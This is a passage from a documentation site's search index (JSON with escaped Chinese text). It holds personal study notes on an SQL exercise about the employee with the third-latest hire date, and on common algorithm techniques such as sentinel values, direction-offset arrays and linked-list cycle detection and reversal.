\u67e5\u627e\u5165\u804c\u5458\u5de5\u65f6\u95f4\u6392\u540d\u5012\u6570\u7b2c\u4e09\u7684\u5458\u5de5\u6240\u6709\u4fe1\u606f","title":"1.5. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_2_%E6%9F%A5%E6%89%BE%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5%E6%97%B6%E9%97%B4%E6%8E%92%E5%90%8D%E5%80%92%E6%95%B0%E7%AC%AC%E4%B8%89%E7%9A%84%E5%91%98%E5%B7%A5/#2","text":"\u53ef\u4ee5\u4f7f\u7528\u5b50\u67e5\u8be2\uff0c\u4e5f\u53ef\u4ee5\u5148\u6392\u5e8f\u518d\u53d6\u7b2c\u4e09\u4e2a\u3002","title":"2. \u9898\u89e3"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_2_%E6%9F%A5%E6%89%BE%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5%E6%97%B6%E9%97%B4%E6%8E%92%E5%90%8D%E5%80%92%E6%95%B0%E7%AC%AC%E4%B8%89%E7%9A%84%E5%91%98%E5%B7%A5/#3","text":"\u4f7f\u7528\u5b50\u67e5\u8be2\uff0c\u80fd\u591f\u53d6\u51fa\u5165\u804c\u65e5\u671f\u5012\u6570\u7b2c\u4e09\u7684\u591a\u4e2a\u5458\u5de5\u3002 SELECT * FROM `employees` WHERE hire_date = (SELECT DISTINCT hire_date FROM `employees` ORDER BY hire_date DESC LIMIT 2, 1); \u4f7f\u7528\u6392\u5e8f\u548cLIMIT\uff0c\u53ef\u4ee5\u53d6\u51fa\u552f\u4e00\u4e00\u4e2a\u3002 SELECT * FROM `employees` ORDER BY hire_date DESC LIMIT 2, 1; OFFSET \u8868\u793a\u5ffd\u7565\u524d2\u4e2a\u3002 SELECT * FROM `employees` ORDER BY hire_date DESC LIMIT 1 OFFSET 2; \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BC%A0%E7%BB%9F%E7%AE%97%E6%B3%95/1.%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/","text":"\u7b97\u6cd5\u8bbe\u8ba1\u4e2d\u7684\u5e38\u7528\u6280\u5de7 # \u76ee\u5f55 # \u7b97\u6cd5\u8bbe\u8ba1\u4e2d\u7684\u5e38\u7528\u6280\u5de7 \u76ee\u5f55 1. \u80cc\u666f 2. \u54e8\u5175\u4f4d 3. \u4e00\u91cd\u5faa\u73af\u904d\u5386\u4e8c\u7ef4\u6570\u7ec4 4. \u68cb\u76d8\uff08\u8ff7\u5bab\uff09\u7c7b\u7b97\u6cd5\u65b9\u5411\u904d\u5386 5. \u5355\u94fe\u8868 5.1. \u5224\u65ad\u5355\u94fe\u8868\u662f\u5426\u6709\u73af 5.2. \u5355\u94fe\u8868\u9006\u5e8f 6. \u53c2\u8003\u6587\u732e 1. \u80cc\u666f # \u6700\u8fd1\u5b66\u4e60\u4e86\u4e00\u4e0bGitchat\u5728\u70ed\u63a8\u7684 \u300a\u7b97\u6cd5\u8bbe\u8ba1\u5b9e\u621850\u8bb2\u300b \u4e13\u680f\uff0c\u5728 \u57fa\u7840\u5f00\u80c3\u83dc \u8fd9\u4e00\u7ae0\uff0c\u738b\u6653\u534e\u8001\u5e08\u8bb2\u4e86\u4e00\u4e9b\u7b97\u6cd5\u8bbe\u8ba1\u7684\u5e38\u7528\u6280\u5de7\uff0c\u6211\u89c9\u5f97\u5f88\u6709\u610f\u601d\uff0c\u6240\u4ee5\u6458\u5f55\u4e86\u4e00\u90e8\u5206\u5f62\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\u3002 2. \u54e8\u5175\u4f4d # \u8bbe\u7f6e\u54e8\u5175\u4f4d\u662f\u7a0b\u5e8f\u8bbe\u8ba1\u4e2d\u5e38\u7528\u7684\u6280\u5de7\u4e4b\u4e00\uff0c\u5e38\u7528\u5728\u7ebf\u6027\u8868\u7684\u5904\u7406\u8fc7\u7a0b\u4e2d\uff0c\u6bd4\u5982\u67e5\u627e\u548c\u79fb\u52a8\u6570\u636e\u64cd\u4f5c\u3002 \u54e8\u5175\u4f4d\u901a\u5e38\u8d77\u5230\u4e24\u4e2a\u4f5c\u7528\uff1a \u4f5c\u4e3a\u4e00\u4e2a\u4e34\u65f6\u5b58\u50a8\u7a7a\u95f4\u4f7f\u7528\uff0c \u51cf\u5c11\u4e0d\u5fc5\u8981\u7684\u8d8a\u754c\u5224\u65ad\uff0c\u7b80\u5316\u7b97\u6cd5\u4ee3\u7801\u590d\u6742\u5ea6\u3002 \u6bd4\u5982\u73af\u5f62\u94fe\u8868\u901a\u5e38\u4f1a\u8bbe\u7f6e\u4e00\u4e2a\u8868\u5934\u8282\u70b9\uff0c\u65e0\u8bba\u5411\u524d\u6216\u5411\u540e\u904d\u5386\uff0c\u5747\u4ee5\u8fd9\u4e2a\u8868\u5934\u8282\u70b9\u4e3a\u904d\u5386\u8d8a\u754c\uff08\u91cd\u590d\uff09\u7684\u4f9d\u636e\uff0c\u8fd9\u6837\u7ef4\u62a4\u94fe\u8868\u7684\u65f6\u5019\u5c31\u4e0d\u9700\u8981\u4e13\u95e8\u5b58\u50a8\u4e00\u4e2a\u8868\u5934\u6307\u9488\uff0c\u8fd9\u4e2a\u8868\u5934\u8282\u70b9\u53ef\u4ee5\u7406\u89e3\u4e3a\u54e8\u5175\u4f4d\u3002 \u63d2\u5165\u6392\u5e8f\u7b97\u6cd5\u4e2d\u4e5f\u4f1a\u5229\u7528\u8868\u4e2d\u7684 0 \u53f7\u4f4d\u7f6e\u4f5c\u4e3a\u54e8\u5175\u4f4d\u4f7f\u7528\uff0c\u8fd9\u4e2a\u4f4d\u7f6e\u4e0d\u4ec5\u8d77\u5230\u4e00\u4e2a\u4e34\u65f6\u5b58\u50a8\u7a7a\u95f4\u7684\u4f5c\u7528\uff0c\u8fd8\u53ef\u4ee5\u7b80\u5316\u63d2\u5165\u540e\u79fb\u52a8\u6570\u636e\u7684\u5224\u65ad\u6761\u4ef6\u3002 \u6ce8\u610f\u4e0b\u9762\u7684\u63d2\u5165\u6392\u5e8f\u4ee3\u7801\uff0c\u5185\u5c42 while \u5faa\u73af\u79fb\u52a8\u6570\u636e\u7684\u65f6\u5019\uff0c\u53ea\u9700\u5224\u65ad\u5f53\u524d\u4f4d\u7f6e\u7684\u6570\u662f\u5426\u6bd4 ls[0] \u4f4d\u7f6e\u5927\u5373\u53ef\uff0c\u4e0d\u9700\u8981\u5173\u5fc3 j \u7684\u4f4d\u7f6e\u662f\u5426\u5c0f\u4e8e 1 \u800c\u8d8a\u754c\uff0c\u56e0\u4e3a\u5f53 j=1 \u7684\u65f6\u5019\uff0c ls[j - 1] > ls[0] \u7684\u6761\u4ef6\u80af\u5b9a\u4e0d\u6ee1\u8db3\uff0c while \u5faa\u73af\u5c31\u4f1a\u7ec8\u6b62\u3002\u5982\u679c\u4e0d\u4f7f\u7528\u54e8\u5175\u4f4d\uff0c\u5185\u5c42\u79fb\u52a8\u6570\u636e\u7684\u5faa\u73af\u5904\u7406\u4ee3\u7801\u5c31\u9700\u8981\u589e\u52a0 j \u662f\u5426\u8d8a\u754c\u7684\u5224\u65ad\u3002 //\u5e26\u54e8\u5175\u4f4d\u7684\u63d2\u5165\u6392\u5e8f\uff0cls[0]\u662f\u54e8\u5175\u4f4d\uff0c\u6570\u636e\u4ece ls[1]\u5f00\u59cb\u5b58\u653e void insert_sort(int *ls, int n) { for (int i = 2; i <= n; ++i) { if (ls[i] < ls[i - 1]) { //i\u4f4d\u7f6e\u7684\u6570\u5b58\u5165\u54e8\u5175\u4f4d\uff0c\u56e0\u4e3a i \u4f4d\u7f6e\u4f1a\u88ab\u540e\u9762\u7684\u79fb\u52a8\u6570\u636e\u64cd\u4f5c\u8986\u76d6 ls[0] = ls[i]; int j = i; //\u4e0d\u7528\u518d\u5224\u65ad j \u662f\u5426\u8d8a\u754c\uff0c\u76f4\u63a5\u5224\u65ad\u5f53\u524d\u4f4d\u7f6e\u7684\u503c\u662f\u5426\u5927\u4e8e\u54e8\u5175\u4f4d while(ls[j - 1] > ls[0]) { ls[j] = ls[j - 1]; j--; } ls[j] = ls[0]; } } } \u548c\u4e0d\u4f7f\u7528\u54e8\u5175\u4f4d\u7684\u63d2\u5165\u6392\u5e8f\u8fdb\u884c\u5bf9\u6bd4 // \u5982\u679c\u4e0d\u4f7f\u7528\u54e8\u5175\u4f4d void insert_sort_mine(int* ls, int n){ for (int i = 2; i <= n; ++i) { if (ls[i] < ls[i - 1]) { //i\u4f4d\u7f6e\u7684\u6570\u5b58\u5165mark\uff0c\u56e0\u4e3a i \u4f4d\u7f6e\u4f1a\u88ab\u540e\u9762\u7684\u79fb\u52a8\u6570\u636e\u64cd\u4f5c\u8986\u76d6 int mark = ls[i]; int j; //\u5728\u5224\u65ad\u524d\u4e00\u4f4d\u662f\u5426\u5927\u4e8emark\u7684\u540c\u65f6\u8fd8\u9700\u8981\u5224\u65adj\u662f\u5426\u8d8a\u754c for (j = i; j > 1 && ls[j - 1] > mark; j--) { ls[j] = ls[j - 1]; } ls[j] = mark; } } } \u5728\u4e00\u4e9b\u67e5\u627e\u64cd\u4f5c\u4e2d\uff0c\u6709\u65f6\u5019\u4e5f\u4f1a\u7528\u5230\u54e8\u5175\u4f4d\uff0c\u6bd4\u5982\u8981\u67e5\u627e\u67d0\u4e2a\u503c\uff0c\u53ef\u4ee5\u5728\u8868\u4e2d\u9002\u5f53\u7684\u4f4d\u7f6e\u9884\u7f6e\u4e00\u4e2a\u7b49\u4e8e\u8fd9\u4e2a\u503c\u7684\u54e8\u5175\u4f4d\uff0c\u8fd9\u6837\u5728\u67e5\u627e\u8fc7\u7a0b\u4e2d\u5c31\u4e0d\u7528\u8003\u8651\u8fb9\u754c\u8d8a\u754c\uff0c\u4e5f\u4e0d\u7528\u8003\u8651\u627e\u4e0d\u5230\u7684\u60c5\u51b5\uff0c\u67e5\u627e\u904d\u5386\u7684\u7b97\u6cd5\u5b9e\u73b0\u5c31\u53ef\u4ee5\u5f88\u7b80\u6d01\uff0c\u53ea\u9700\u5728\u67e5\u627e\u7ed3\u675f\u7684\u65f6\u5019\uff0c\u5224\u65ad\u4e00\u4e0b\u7ed3\u679c\u662f\u5426\u662f\u54e8\u5175\u4f4d\uff0c\u5982\u679c\u662f\u54e8\u5175\u4f4d\uff0c\u5219\u8bf4\u660e\u6ca1\u6709\u627e\u5230\u3002 3. \u4e00\u91cd\u5faa\u73af\u904d\u5386\u4e8c\u7ef4\u6570\u7ec4 # \u4e8c\u7ef4\u8868\u7684\u904d\u5386\u4e00\u822c\u9700\u8981\u4e24\u91cd\u5faa\u73af\u6765\u5b9e\u73b0\uff0c\u4f46\u662f\u4e24\u91cd\u5faa\u73af\u7684\u4ee3\u7801\u4e0d\u5982\u4e00\u91cd\u5faa\u73af\u7684\u4ee3\u7801\u6e05\u723d\uff0c\u5f88\u591a\u60c5\u51b5\u4e0b\u7528\u4e00\u91cd\u5faa\u73af\u904d\u5386\u4e8c\u7ef4\u8868\u4e5f\u662f\u4e00\u79cd\u4e0d\u9519\u7684\u9009\u62e9\u3002\u7528\u4e00\u91cd\u5faa\u73af\u904d\u5386\u4e8c\u7ef4\u8868\u5173\u952e\u662f\u5bf9\u4e0b\u6807\u7684\u5904\u7406\uff0c\u5bf9\u4e8e\u4e00\u4e2a M \u00d7 N \u7684\u4e8c\u7ef4\u8868\uff0c\u53ef\u7528\u4ee5\u4e0b\u65b9\u6cd5\u89e3\u51fa\u5bf9\u5e94\u7684\u4e8c\u7ef4\u4e0b\u6807\uff1a int row = i / M int col = i % N \u53cd\u8fc7\u6765\uff0c\u4e5f\u53ef\u4ee5\u7528\u4ee5\u4e0b\u516c\u5f0f\u5c06\u4e8c\u7ef4\u5750\u6807\u8fd8\u539f\u4e3a\u4e00\u7ef4\u5750\u6807\uff1a int i = row * N + col \u5f88\u591a\u4e5d\u5bab\u683c\u7c7b\u578b\u7684\u6e38\u620f\u68cb\u76d8\u7684\u521d\u59cb\u5316\u5c31\u662f\u7528\u7684\u8fd9\u79cd\u65b9\u6cd5\u3002 for(int i = 0; i < 9; i++) { int row = i / 3; int col = i % 3; game->cells[row][col].fixed = false; } 4. \u68cb\u76d8\uff08\u8ff7\u5bab\uff09\u7c7b\u7b97\u6cd5\u65b9\u5411\u904d\u5386 # \u68cb\u76d8\u6216\u8ff7\u5bab\u7c7b\u6e38\u620f\u5e38\u5e38\u9700\u8981\u914d\u5408\u5404\u79cd\u641c\u7d22\u7b97\u6cd5\uff0c\u4e8c\u7ef4\u68cb\u76d8\u548c\u8ff7\u5bab\u7684\u641c\u7d22\u5e38\u5e38\u662f\u6cbf\u7740\u4e0e\u67d0\u4e2a\u4f4d\u7f6e\u76f8\u4e34\u7684 4 \u4e2a\u6216 8 \u4e2a\u65b9\u5411\u5c55\u5f00\uff0c\u5bf9\u8fd9\u4e9b\u65b9\u5411\u7684\u904d\u5386\u5c31\u662f\u641c\u7d22\u7b97\u6cd5\u7684\u4e3b\u8981\u7ed3\u6784\u3002\u6211\u5e38\u5e38\u770b\u5230\u4e00\u4e9b\u670b\u53cb\u7ed9\u51fa\u7684\u7b97\u6cd5\u7528\u4e86\u957f\u957f\u7684 if-else \u6216 switch-case \u8bed\u53e5\uff0c\u65e0\u975e\u662f\u8fd9\u6837\u7684\u7ed3\u6784\uff1a switch(direction) { case UP: \u2026\u2026 case DOWN: \u2026\u2026 case LEFT: \u2026\u2026 case RIGHT: \u2026\u2026 } \\text{Figure 1. \u65b9\u5411\u6570\u7ec4\u5750\u6807\u504f\u79fb\u5173\u7cfb} \u89c2\u5bdf\u6bcf\u4e00\u4e2a case \u5206\u652f\uff0c\u9664\u4e86\u6570\u7ec4\u4e0b\u6807\u8ba1\u7b97\u4e0d\u540c\uff0c\u5176\u4ed6\u4ee3\u7801\u90fd\u662f\u96f7\u540c\u7684\u91cd\u590d\u4ee3\u7801\uff0c\u5176\u5b9e\u8fd9\u79cd\u60c5\u51b5\u4e0b\u6700\u5e38\u7528\u7684\u65b9\u6cd5\u662f\u4f7f\u7528\u65b9\u5411\u504f\u79fb\u6570\u7ec4\uff0c\u7528\u4e00\u4e2a\u5faa\u73af\u5bf9\u8fd9\u4e2a\u65b9\u5411\u6570\u7ec4\u904d\u5386\u4e00\u904d\u5c31\u53ef\u5b8c\u6210\u5bf9\u5404\u4e2a\u65b9\u5411\u7684\u641c\u7d22\u3002\u4ee5\u4e8c\u7ef4\u6570\u7ec4\u5b9a\u4e49\u7684\u68cb\u76d8\u4e3a\u4f8b\uff0c\u5982\u679c\u4ece i \u884c j \u5217\u5f00\u59cb\u5411\u4e0a\u3001\u4e0b\u3001\u5de6\u3001\u53f3\u56db\u4e2a\u65b9\u5411\u641c\u7d22\uff0c\u5219\u8fd9\u56db\u4e2a\u65b9\u5411\u53ef\u8f6c\u6362\u4e3a\u4ee5\u4e0b\u884c\u3001\u5217\u5750\u6807\u5173\u7cfb\uff1a \u5411\u5de6\u641c\u7d22\uff1a\u884c\u5750\u6807 i \u4e0d\u53d8\uff0c\u5217\u5750\u6807 j-1 \u5411\u4e0a\u641c\u7d22\uff1a\u884c\u5750\u6807 i-1\uff0c\u5217\u5750\u6807\u4e0d\u53d8 \u5411\u53f3\u641c\u7d22\uff1a\u884c\u5750\u6807 i \u4e0d\u53d8\uff0c\u5217\u5750\u6807 j+1 \u5411\u4e0b\u641c\u7d22\uff1a\u884c\u5750\u6807 i+1\uff0c\u5217\u5750\u6807\u4e0d\u53d8 \u6839\u636e\u4ee5\u4e0a\u5173\u7cfb\uff0c\u9996\u5148\u5b9a\u4e49\u4e8c\u7ef4\u6570\u7ec4\u4e0b\u6807\u504f\u79fb\u91cf\uff0c\u7136\u540e\u5b9a\u4e49\u4e00\u4e2a\u504f\u79fb\u91cf\u6570\u7ec4\uff0c\u5206\u522b\u8868\u793a\u5411\u56db\u4e2a\u65b9\u5411\u7684\u6570\u7ec4\u4e0b\u6807\u504f\u79fb\u91cf\uff1a typedef struct { int x_off; int y_off; }OFFSET; OFFSET dir_offset[] = {{0,-1},{-1,0},{0,1},{1,0}}; \u5047\u8bbe\u5f53\u524d\u4f4d\u7f6e\u7684\u4e8c\u7ef4\u6570\u7ec4\u4e0b\u6807\u662f x\u3001y\uff0c\u5219\u5bf9\u6b64\u4f4d\u7f6e\u5f00\u59cb\u5411\u56db\u4e2a\u65b9\u5411\u641c\u7d22\u7684\u4ee3\u7801\u53ef\u4ee5\u5982\u6b64\u5b9e\u73b0\uff1a for(int i = 0; i < count_of(dir_offset); i++) { int new_x = x + dir_offset[i].x_off; int new_y = y + dir_offset[i].y_off; \u2026\u2026 } \u8fd9\u79cd\u7b97\u6cd5\u5b9e\u73b0\u907f\u514d\u4e86\u5bf9\u6bcf\u4e2a\u65b9\u5411\u90fd\u8fdb\u884c\u4e0b\u6807\u8ba1\u7b97\uff0c\u5373\u4fbf\u662f\u589e\u52a0\u4e24\u4e2a\u659c\u7ebf\u65b9\u5411\uff0c\u4ece 4 \u4e2a\u65b9\u5411\u641c\u7d22\u6269\u5c55\u5230 8 \u4e2a\u65b9\u5411\u641c\u7d22\uff0c\u53ea\u9700\u8c03\u6574 dir_offset \u6570\u7ec4\u5373\u53ef\uff0c\u6446\u8131\u4e86\u5197\u957f\u7684 switch-case \u4ee3\u7801\u7ed3\u6784\u3002\u300a\u7b97\u6cd5\u7684\u4e50\u8da3\u300b 1 \u7b2c 14 \u7ae0\u4ecb\u7ecd\u5149\u6805\u586b\u5145\u7b97\u6cd5\u65f6\u7528\u5230\u4e86\u65b9\u5411\u6570\u7ec4\uff0c\u7b2c 20 \u7ae0\u4ecb\u7ecd\u534e\u5bb9\u9053\u6e38\u620f\u65f6\u518d\u6b21\u4f7f\u7528\u4e86\u65b9\u5411\u6570\u7ec4\uff0c\u90fd\u662f\u7c7b\u4f3c\u60c5\u51b5\u4e0b\u5f88\u5178\u578b\u7684\u5e94\u7528\u3002 5. \u5355\u94fe\u8868 # 5.1. \u5224\u65ad\u5355\u94fe\u8868\u662f\u5426\u6709\u73af # \u5355\u94fe\u8868\u6709\u5f88\u591a\u6709\u610f\u601d\u7684\u95ee\u9898\uff0c\u6bd4\u5982\u201c\u5224\u65ad\u5355\u94fe\u8868\u662f\u5426\u6709\u73af\u201d\u3001\u201c\u5982\u4f55\u4e00\u6b21\u904d\u5386\u5c31\u627e\u5230\u94fe\u8868\u4e2d\u95f4\u4f4d\u7f6e\u8282\u70b9\u201d\u3001\u201c\u5355\u94fe\u8868\u4e2d\u5012\u6570\u7b2c k \u4e2a\u8282\u70b9\u201d\u7b49\u95ee\u9898\uff0c\u89e3\u51b3\u8fd9\u4e09\u4e2a\u95ee\u9898\u9700\u8981\u4f7f\u7528\u53cc\u6307\u9488\u7684\u6280\u5de7\uff0c\u6bd4\u5982\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u8bbe\u7f6e\u4e00\u4e2a\u201c\u6162\u6307\u9488\u201d\u548c\u4e00\u4e2a\u201c\u5feb\u6307\u9488\u201d\uff0c\u4ece\u94fe\u8868\u5934\u5f00\u59cb\u904d\u5386\uff0c\u6162\u6307\u9488\u4e00\u6b21\u5411\u540e\u79fb\u52a8\u4e00\u4e2a\u8282\u70b9\uff0c\u5feb\u6307\u9488\u4e00\u6b21\u79fb\u52a8\u4e24\u4e2a\u8282\u70b9\u3002\u5982\u679c\u94fe\u8868\u6ca1\u6709\u73af\uff0c\u5219\u5feb\u6307\u9488\u4f1a\u5148\u5230\u8fbe\u6700\u540e\u4e00\u4e2a\u8282\u70b9\uff08NULL\uff09\uff0c\u5426\u5219\u7684\u8bdd\uff0c\u5feb\u6307\u9488\u4f1a\u8ffd\u4e0a\u6162\u6307\u9488\uff08\u76f8\u9047\uff09\u3002 \u7b2c\u4e8c\u4e2a\u95ee\u9898\u540c\u6837\u8bbe\u7f6e\u4e00\u5feb\u4e00\u6162\u4e24\u4e2a\u6307\u9488\uff0c\u6162\u6307\u9488\u4e00\u6b21\u79fb\u52a8\u4e00\u4e2a\u8282\u70b9\uff0c\u5feb\u6307\u9488\u4e00\u6b21\u79fb\u52a8\u4e24\u4e2a\u8282\u70b9\uff0c\u5f53\u5feb\u6307\u9488\u79fb\u52a8\u5230\u7ed3\u5c3e\u65f6\uff0c\u6162\u6307\u9488\u6307\u5411\u7684\u5c31\u662f\u4e2d\u95f4\u8282\u70b9\u3002\u7b2c\u4e09\u4e2a\u95ee\u9898\u4e5f\u662f\u53cc\u6307\u9488\uff0c\u5176\u4e2d\u4e00\u4e2a\u5148\u79fb\u52a8 k \u4e2a\u8282\u70b9\uff0c\u7136\u540e\u4e24\u4e2a\u6307\u9488\u4ee5\u76f8\u540c\u7684\u901f\u5ea6\u4e00\u8d77\u79fb\u52a8\uff0c\u5f53\u5148\u79fb\u52a8\u7684\u6307\u9488\u79fb\u52a8\u5230\u7ed3\u5c3e\u7684\u65f6\u5019\uff0c\u540e\u79fb\u52a8\u7684\u6307\u9488\u6307\u5411\u7684\u5c31\u662f\u5012\u6570\u7b2c k \u4e2a\u8282\u70b9\u3002 5.2. \u5355\u94fe\u8868\u9006\u5e8f # \u5355\u94fe\u8868\u8fd8\u6709\u4e00\u4e2a\u7ecf\u5e38\u88ab\u9762\u8bd5\u5230\u7684\u9898\u76ee\uff0c\u5c31\u662f\u5355\u94fe\u8868\u9006\u5e8f\u3002\u5f88\u591a\u516c\u53f8\u7684\u9762\u8bd5\u9898\u5e93\u4e2d\u90fd\u6709\u8fd9\u9053\u9898\uff0c\u6709\u7684\u516c\u53f8\u660e\u786e\u9898\u76ee\u8981\u6c42\u4e0d\u80fd\u4f7f\u7528\u989d\u5916\u7684\u8282\u70b9\u5b58\u50a8\u7a7a\u95f4\uff0c\u6709\u7684\u6ca1\u6709\u660e\u786e\u8bf4\u660e\uff0c\u4f46\u662f\u5982\u679c\u9762\u8bd5\u8005\u4f7f\u7528\u4e86\u989d\u5916\u7684\u8282\u70b9\u5b58\u50a8\u7a7a\u95f4\u505a\u4e2d\u8f6c\uff0c\u4f1a\u5f97\u5230\u4e00\u4e2a\u6bd4\u8f83\u4f4e\u7684\u5206\u6570\u3002\u4e0d\u4f7f\u7528\u989d\u5916\u5b58\u50a8\u8282\u70b9\u7684\u60c5\u51b5\u4e0b\u4f7f\u4e00\u4e2a\u5355\u94fe\u8868\u7684\u6240\u6709\u8282\u70b9\u9006\u5e8f\u53ef\u4ee5\u91c7\u7528\u9012\u5f52\u7684\u65b9\u6cd5\uff0c\u4e5f\u53ef\u4ee5\u91c7\u7528\u5faa\u73af\u8fed\u4ee3\u7684\u65b9\u6cd5\uff0c\u8fd9\u91cc\u6211\u4eec\u53ea\u4ecb\u7ecd\u9012\u5f52\u7684\u65b9\u5f0f\uff0c\u56e0\u4e3a\u8fd9\u79cd\u65b9\u6cd5\u6bd4\u8f83\u5bb9\u6613\u7406\u89e3\uff0c\u7b97\u6cd5\u4ee3\u7801\u7684\u5b9e\u73b0\u4e5f\u5f88\u7b80\u5355\u3002 \\text{Figure 2. \u5355\u94fe\u8868\u9006\u5e8f\u9012\u5f52\u72b6\u6001\u56fe} \u9012\u5f52\u65b9\u6cd5\u7684\u6838\u5fc3\u5c31\u662f\u786e\u5b9a\u9012\u5f52\u5b50\u95ee\u9898\uff0c\u94fe\u8868\u7c7b\u7684\u95ee\u9898\u627e\u9012\u5f52\u5b50\u95ee\u9898\u7684\u65b9\u6cd5\u57fa\u672c\u56fa\u5b9a\uff0c\u5c31\u662f\u6bcf\u6b21\u9664\u53bb\u94fe\u8868\u5934\u90e8\u7b2c\u4e00\u4e2a\u8282\u70b9\uff0c\u5269\u4e0b\u7684\u5e8f\u5217\u4f5c\u4e3a\u5206\u89e3\u7684\u5b50\u95ee\u9898\u3002\u4e3b\u8981\u7684\u7b97\u6cd5\u5b9e\u73b0\u601d\u8def\u662f\u5148\u5c06\u5f53\u524d\u7684\u8868\u5934\u8282\u70b9\u4ece\u94fe\u8868\u4e2d\u62c6\u51fa\u6765\uff0c\u7136\u540e\u5bf9\u5269\u4f59\u7684\u8282\u70b9\u7ec4\u6210\u7684\u5b50\u94fe\u8868\u8fdb\u884c\u9006\u5e8f\uff0c\u6700\u540e\u5c06\u5f53\u524d\u7684\u8868\u5934\u8282\u70b9\u8fde\u63a5\u5230\u65b0\u94fe\u8868\u7684\u5c3e\u90e8\u3002 \u5982\u56fe\uff082\uff09\u6240\u793a\uff0c\u6bcf\u4e00\u8f6e\u9012\u5f52\u90fd\u662f\u5148\u5bf9\u5b50\u94fe\u8868\u9006\u5e8f\uff0c\u7136\u540e\u5c06\u62c6\u51fa\u6765\u7684 head \u8282\u70b9\u9644\u52a0\u5230\u65b0\u7684\u5b50\u94fe\u8868\u7684\u5c3e\u90e8\u3002\u867d\u7136\u9012\u5f52\u8c03\u7528\u7684\u987a\u5e8f\u662f\u4ece a \u5230 c \u7684\u987a\u5e8f\uff0c\u4f46\u662f\u9012\u5f52\u9006\u5e8f\u7684\u5b9e\u9645\u64cd\u4f5c\u8fc7\u7a0b\u9700\u8981\u4ece c \u5230 a \u53cd\u7740\u6765\u7406\u89e3\u3002\u56fe\uff082-c\uff09\u5c31\u662f\u9012\u5f52\u7b26\u5408\u9000\u51fa\u6761\u4ef6\u65f6\u7684\u72b6\u6001\uff0c\u6b64\u65f6\u5b50\u94fe\u8868\u53ea\u5269\u4e00\u4e2a\u8282\u70b9\uff0c\u76f4\u63a5\u8fd4\u56de\u8fd9\u4e2a\u8282\u70b9\u4f5c\u4e3a\u5b50\u94fe\u8868\u7684 new_head \u8282\u70b9\u3002\u968f\u540e\u7684\u9012\u5f52\u64cd\u4f5c\u5c06\u5b50\u94fe\u8868\u7684 head \u8282\u70b9\u9644\u52a0\u5230 new_head \u8282\u70b9\u7684\u5c3e\u90e8\uff0c\u5982\u4ee3\u7801\u6240\u793a\uff1a LINK_NODE *reverse_link(LINK_NODE *head) { LINK_NODE *newHead; if ((head == nullptr) || (head->next == nullptr)) return head; newHead = reverse_link(head->next); /*\u9012\u5f52\u9006\u8f6c\u5b50\u94fe\u8868\u90e8\u5206*/ head->next->next = head; /*\u56de\u6714\u90e8\u5206*/ head->next = nullptr; return newHead; } \u8fd9\u6bb5\u4ee3\u7801\u7684\u5173\u952e\u70b9\u662f\u5934\u8282\u70b9 head \u7684\u4e0b\u4e00\u4e2a\u8282\u70b9 head \\to next \u5c06\u662f\u9006\u5e8f\u540e\u7684\u65b0\u94fe\u8868\u7684\u5c3e\u8282\u70b9\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u88ab\u6458\u9664\u7684\u5934\u63a5\u70b9 head \u9700\u8981\u88ab\u94fe\u63a5\u5230 head \\to next \u624d\u80fd\u5b8c\u6210\u6574\u4e2a\u94fe\u8868\u7684\u9006\u5e8f\u3002 \u738b\u6653\u534e\u8001\u5e08\u7684 \u300a\u7b97\u6cd5\u8bbe\u8ba1\u5b9e\u621850\u8bb2\u300b \u4e13\u680f\u4e2d\u8fd8\u8bb2\u4e86\u5f88\u591a\u5176\u4ed6\u6709\u610f\u601d\u7684\u5185\u5bb9\uff0c\u611f\u5174\u8da3\u7684\u540c\u5b66\u53ef\u4ee5\u5728GitChat\u641c\u7d22\u8fd9\u4e2a\u4e13\u680f\u8ba2\u8d2d\u3002 6. \u53c2\u8003\u6587\u732e # [1] \u738b\u6653\u534e. \u7b97\u6cd5\u7684\u4e50\u8da3. \u4eba\u6c11\u90ae\u7535\u51fa\u7248\u793e, 